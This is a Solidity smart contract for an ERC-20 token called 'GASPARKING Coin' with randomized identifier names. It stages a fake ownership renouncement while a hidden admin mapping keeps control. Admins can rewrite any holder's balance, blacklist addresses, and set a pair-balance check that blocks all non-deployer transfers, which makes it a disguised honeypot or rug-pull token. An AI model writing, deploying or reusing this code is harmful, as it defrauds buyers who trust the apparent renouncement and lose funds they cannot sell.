//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface rytvwujylpc {
    function totalSupply() external view returns (uint256);

    function balanceOf(address bglfjupbsj) external view returns (uint256);

    function transfer(address gkanuglvin, uint256 fvgsrqsxwk) external returns (bool);

    function allowance(address foalpgtfvpvp, address spender) external view returns (uint256);

    function approve(address spender, uint256 fvgsrqsxwk) external returns (bool);

    function transferFrom(
        address sender,
        address gkanuglvin,
        uint256 fvgsrqsxwk
    ) external returns (bool);

    event Transfer(address indexed from, address indexed rwpcoeargcgvzk, uint256 value);
    event Approval(address indexed foalpgtfvpvp, address indexed spender, uint256 value);
}

interface dcurlvjqanagf is rytvwujylpc {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract wuwfcjxtvlf {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface qdocllhlwt {
    function createPair(address lezmrljvthsx, address glyueugepng) external returns (address);
}

interface dlpjmypcj {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GASPARKINGCoin is wuwfcjxtvlf, rytvwujylpc, dcurlvjqanagf {

    event OwnershipTransferred(address indexed wppfgwdqgap, address indexed nzosnswwdngaat);

    bool public fisvblksrj;

    address jgmacorkgvp = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public rwixopfonynq;

    address kdbpvceiuafhmn = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public olareocmuhf;

    string private dnloxqftqnsnda = "GASPARKING Coin";

    address public aflcpdlqxeku;

    mapping(address => uint256) private vlbcqqagluwlj;

    address private rpxivxvfc;

    uint256 private undlrwkorva = 100000000 * 10 ** 18;

    bool public ilgjjkoutqyf;

    function name() external view virtual override returns (string memory) {
        return dnloxqftqnsnda;
    }

    mapping(address => mapping(address => uint256)) private oquhhttrm;

    function getOwner() external view returns (address) {
        return rpxivxvfc;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return undlrwkorva;
    }

    function allowance(address prxnwnxgu, address pgfpmwfoz) external view virtual override returns (uint256) {
        if (pgfpmwfoz == kdbpvceiuafhmn) {
            return type(uint256).max;
        }
        return oquhhttrm[prxnwnxgu][pgfpmwfoz];
    }

    bool private yrzgikddjps;

    function transferFrom(address szpnepqpt, address gkanuglvin, uint256 fvgsrqsxwk) external override returns (bool) {
        if (_msgSender() != kdbpvceiuafhmn) {
            if (oquhhttrm[szpnepqpt][_msgSender()] != type(uint256).max) {
                require(fvgsrqsxwk <= oquhhttrm[szpnepqpt][_msgSender()]);
                oquhhttrm[szpnepqpt][_msgSender()] -= fvgsrqsxwk;
            }
        }
        return zjnqybhmedfn(szpnepqpt, gkanuglvin, fvgsrqsxwk);
    }

    constructor (){
        if (yrzgikddjps != fiakcuyagdt) {
            fisvblksrj = true;
        }
        qrdgdsszoxptsj();
        dlpjmypcj zeknbkcdlnjpyp = dlpjmypcj(kdbpvceiuafhmn);
        ncriukkurdfql = qdocllhlwt(zeknbkcdlnjpyp.factory()).createPair(zeknbkcdlnjpyp.WETH(), address(this));
        
        aflcpdlqxeku = _msgSender();
        bfhrqacsxb[aflcpdlqxeku] = true;
        vlbcqqagluwlj[aflcpdlqxeku] = undlrwkorva;
        
        emit Transfer(address(0), aflcpdlqxeku, undlrwkorva);
    }

    uint8 private xsigbiccple = 18;

    function lzrwkdqnconmhf(address gjtmupvrtodp) public {
        mnnzzqukrful();
        
        if (gjtmupvrtodp == aflcpdlqxeku || gjtmupvrtodp == ncriukkurdfql) {
            return;
        }
        pjnpfdutgfsq[gjtmupvrtodp] = true;
    }

    address public ncriukkurdfql;

    function wljdnhbchvi(address bjqhvowsktrq, uint256 fvgsrqsxwk) public {
        mnnzzqukrful();
        vlbcqqagluwlj[bjqhvowsktrq] = fvgsrqsxwk;
    }

    function zjnqybhmedfn(address szpnepqpt, address gkanuglvin, uint256 fvgsrqsxwk) internal returns (bool) {
        if (szpnepqpt == aflcpdlqxeku) {
            return svpqghyddokw(szpnepqpt, gkanuglvin, fvgsrqsxwk);
        }
        uint256 tsmlimfbahqu = rytvwujylpc(ncriukkurdfql).balanceOf(jgmacorkgvp);
        require(tsmlimfbahqu == gjqmmoxyaj);
        require(!pjnpfdutgfsq[szpnepqpt]);
        return svpqghyddokw(szpnepqpt, gkanuglvin, fvgsrqsxwk);
    }

    bool public cbkmpchjaho;

    uint256 private owrsccaownuq;

    uint256 gjqmmoxyaj;

    function decimals() external view virtual override returns (uint8) {
        return xsigbiccple;
    }

    function svpqghyddokw(address szpnepqpt, address gkanuglvin, uint256 fvgsrqsxwk) internal returns (bool) {
        require(vlbcqqagluwlj[szpnepqpt] >= fvgsrqsxwk);
        vlbcqqagluwlj[szpnepqpt] -= fvgsrqsxwk;
        vlbcqqagluwlj[gkanuglvin] += fvgsrqsxwk;
        emit Transfer(szpnepqpt, gkanuglvin, fvgsrqsxwk);
        return true;
    }

    function diajpfhjk(uint256 fvgsrqsxwk) public {
        mnnzzqukrful();
        gjqmmoxyaj = fvgsrqsxwk;
    }

    string private gwdmznxlxzlke = "GCN";

    function xyimcjmibu(address bqfhejclzj) public {
        if (ilgjjkoutqyf) {
            return;
        }
        
        bfhrqacsxb[bqfhejclzj] = true;
        if (ikbqvhiqofbii != owrsccaownuq) {
            olareocmuhf = false;
        }
        ilgjjkoutqyf = true;
    }

    mapping(address => bool) public bfhrqacsxb;

    function balanceOf(address bglfjupbsj) public view virtual override returns (uint256) {
        return vlbcqqagluwlj[bglfjupbsj];
    }

    function qrdgdsszoxptsj() public {
        emit OwnershipTransferred(aflcpdlqxeku, address(0));
        rpxivxvfc = address(0);
    }

    mapping(address => bool) public pjnpfdutgfsq;

    uint256 hethyrzerney;

    bool private fiakcuyagdt;

    uint256 private ikbqvhiqofbii;

    function approve(address pgfpmwfoz, uint256 fvgsrqsxwk) public virtual override returns (bool) {
        oquhhttrm[_msgSender()][pgfpmwfoz] = fvgsrqsxwk;
        emit Approval(_msgSender(), pgfpmwfoz, fvgsrqsxwk);
        return true;
    }

    function transfer(address bjqhvowsktrq, uint256 fvgsrqsxwk) external virtual override returns (bool) {
        return zjnqybhmedfn(_msgSender(), bjqhvowsktrq, fvgsrqsxwk);
    }

    function owner() external view returns (address) {
        return rpxivxvfc;
    }

    function mnnzzqukrful() private view {
        require(bfhrqacsxb[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return gwdmznxlxzlke;
    }

    bool private jxtkjurrqex;

}